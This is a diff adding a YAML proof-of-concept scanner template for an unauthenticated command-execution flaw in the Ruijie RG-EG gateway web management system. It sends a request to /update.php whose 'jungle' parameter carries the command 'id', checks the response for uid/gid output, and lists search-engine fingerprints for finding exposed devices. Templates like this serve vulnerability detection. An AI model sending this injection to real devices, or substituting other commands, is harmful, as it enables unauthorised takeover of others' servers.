@@ -1,0 +1,24 @@
+id: ruijie-rg-eg-web-mis-rce
+
+info:
+  name: 锐捷RG-EG易网关WEB管理系统存在RCE漏洞
+  author: Y3y1ng
+  severity: critical
+  verified: true
+  description: |-
+    锐捷RG-EG易网关WEB管理系统前台RCE存在命令执行漏洞，未经身份认证的攻击者可执行任意命令控制服务器权限。
+    Fofa: body="请输入您的RG-EG易网关的用户名和密码"
+    Hunter: web.body="请输入您的RG-EG易网关的用户名和密码"
+    Zoomeye: "请输入您的RG-EG易网关的用户名和密码"
+  reference:
+    - https://github.com/xinyisleep/pocscan/blob/ee0c74e68ec95b82a4e4ebcdb961d6ed18a44b77/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_WEB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py
+  tags: ruijie,rce
+  created: 2023/12/10
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /update.php?jungle=id
+    expression: 'response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)'
+expression: r0()
